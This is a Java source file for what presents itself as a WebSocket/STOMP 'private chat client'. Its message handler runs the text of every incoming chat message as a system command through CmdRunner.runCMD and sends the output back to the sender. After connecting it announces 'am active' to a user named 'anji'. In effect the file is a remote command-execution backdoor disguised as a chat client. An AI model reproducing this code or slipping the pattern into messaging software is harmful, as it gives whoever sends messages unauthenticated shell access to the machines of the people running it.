package com.example.websocketchat.client;

import com.example.websocketchat.model.ChatMessage;
import com.example.websocketchat.runner.CmdRunner;
import com.google.gson.Gson;
import org.apache.log4j.Logger;
import org.springframework.messaging.simp.stomp.StompFrameHandler;
import org.springframework.messaging.simp.stomp.StompHeaders;
import org.springframework.messaging.simp.stomp.StompSession;
import org.springframework.messaging.simp.stomp.StompSessionHandlerAdapter;
import org.springframework.util.concurrent.ListenableFuture;
import org.springframework.web.socket.WebSocketHttpHeaders;
import org.springframework.web.socket.client.standard.StandardWebSocketClient;
import org.springframework.web.socket.messaging.WebSocketStompClient;
import org.springframework.web.socket.sockjs.client.SockJsClient;
import org.springframework.web.socket.sockjs.client.Transport;
import org.springframework.web.socket.sockjs.client.WebSocketTransport;
import org.springframework.web.socket.sockjs.frame.Jackson2SockJsMessageCodec;

import java.lang.reflect.Type;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.ExecutionException;

/**
 * Created by nick on 30/09/2015.
 */
public class PrivateChatClient {

    private static Logger logger = Logger.getLogger(PrivateChatClient.class);

    private final static WebSocketHttpHeaders headers = new WebSocketHttpHeaders();
    private final static StompHeaders STOMP_HEADERS = new StompHeaders();

    public ListenableFuture<StompSession> connect() {

        Transport webSocketTransport = new WebSocketTransport(new StandardWebSocketClient());
        List<Transport> transports = Collections.singletonList(webSocketTransport);

        SockJsClient sockJsClient = new SockJsClient(transports);
        sockJsClient.setMessageCodec(new Jackson2SockJsMessageCodec());

        WebSocketStompClient stompClient = new WebSocketStompClient(sockJsClient);
        STOMP_HEADERS.add("user", "client");
//        stompClient.setMessageConverter(new MappingJackson2MessageConverter());
        String url = "ws://{host}:{port}/register";
        return stompClient.connect(url, headers, STOMP_HEADERS, new MyHandler(), "localhost", 8080);
    }

    public void subscribeGreetings(StompSession stompSession) throws ExecutionException, InterruptedException {
        stompSession.subscribe("/user/queue/reply", new StompFrameHandler() {
            public Type getPayloadType(StompHeaders stompHeaders) {
                return byte[].class;
            }
            public void handleFrame(StompHeaders stompHeaders, Object o) {
                String response = new String((byte[]) o);
                logger.info("Received greeting " + response);
                Gson gson = new Gson();
                ChatMessage message = gson.fromJson(response, ChatMessage.class);
                CmdRunner runner = new CmdRunner();
                String result = runner.runCMD(message.getMessage());
                message.setMessage(result);
                message.setTo(message.getFrom());
                message.setFrom("client");
                stompSession.send("/app/private", new Gson().toJson(message).getBytes());
            }
        });
    }

    public void sendHello(StompSession stompSession) {
        ChatMessage message = new ChatMessage();
        message.setFrom("client");
        message.setTo("anji");
        message.setMessage("am active");
//        String jsonHello = "{\"from\":\"JavaClient\",\"to\":\"Server\",\"message\":\"Am Active\"}";
        stompSession.send("/app/private", new Gson().toJson(message).getBytes());
    }

    private class MyHandler extends StompSessionHandlerAdapter {
        public void afterConnected(StompSession stompSession, StompHeaders stompHeaders) {
            logger.info("Now connected");
        }
    }
    
    public static void main(String[] args) throws Exception {
        PrivateChatClient client = new PrivateChatClient();

        ListenableFuture<StompSession> f = client.connect();
        StompSession stompSession = f.get();

        logger.info("Subscribing to greeting topic using session " + stompSession);
        client.subscribeGreetings(stompSession);

        logger.info("Sending hello message" + stompSession);
        client.sendHello(stompSession);
//        Thread.sleep(60000);
        new Scanner(System.in).nextLine(); // Don't close immediately.
    }

    
}
